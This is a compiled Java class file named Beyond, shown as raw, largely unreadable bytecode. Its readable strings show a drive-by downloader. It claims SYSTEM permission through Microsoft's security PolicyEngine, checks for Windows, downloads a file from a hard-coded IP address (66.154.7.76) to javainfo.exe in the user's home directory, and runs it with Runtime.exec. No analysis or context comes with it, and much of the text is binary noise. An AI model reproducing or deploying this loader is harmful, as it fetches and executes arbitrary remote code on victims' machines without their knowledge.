����  -   Beyond  java/lang/Object  BeyondInterface someParameter Ljava/lang/String; Init ()V Code LineNumberTable   SYSTEM Lcom/ms/security/PermissionID;	    com/ms/security/PermissionID   assertPermission !(Lcom/ms/security/PermissionID;)V
    com/ms/security/PolicyEngine  javainfo.exe  java/lang/StringBuffer  
 <init>
   ! 	user.home # c: % & getProperty 8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
 ( $ ) java/lang/System + , append ,(Ljava/lang/String;)Ljava/lang/StringBuffer;
  * + / (C)Ljava/lang/StringBuffer;
  . 2 3 toString ()Ljava/lang/String;
  1 6 http://66.154.7.76/user/ds/  8 (Ljava/lang/String;)V
  7  	  : = os.name % ? &(Ljava/lang/String;)Ljava/lang/String;
 ( > B 3 toLowerCase
 D A E java/lang/String G windows I J 
startsWith (Ljava/lang/String;)Z
 D H M java/net/URL
 L 7 P Q openConnection ()Ljava/net/URLConnection;
 L O T U getInputStream ()Ljava/io/InputStream;
 W S X java/net/URLConnection Z java/io/FileOutputStream
 Y 7 ] ^ write ([BII)V
 Y \ a b read ([B)I
 d ` e java/io/InputStream g 
 close
 Y f
 d f k java/io/IOException m 
 printStackTrace
 j l p q 
getRuntime ()Ljava/lang/Runtime;
 s o t java/lang/Runtime v w exec '(Ljava/lang/String;)Ljava/lang/Process;
 s u z java/lang/Throwable setSomeParameter
   
SourceFile Beyond.java !             	 
    E     Ų � L� Y�  "� '� -\� 0� 4M� Y5� 9*� ;� -� 4N� Y� ,� -+� -� 4:<� @� C:F� K� d� LY-� N� R:� V:� YY� [: �:	6
� 	
� _	� cY6
���� h� i� 
:� n� r� x:� L�  _ � � j   � � y     ^          	  #  7  K % U ' _ 5 _ 7 l 8 s 9 ~ : � ; � ; � < � ; � > � ? � C � E � F � M  { 8     "     *+� ;�       
    Q  R   
     !     *� |�       
    	  	  }    ~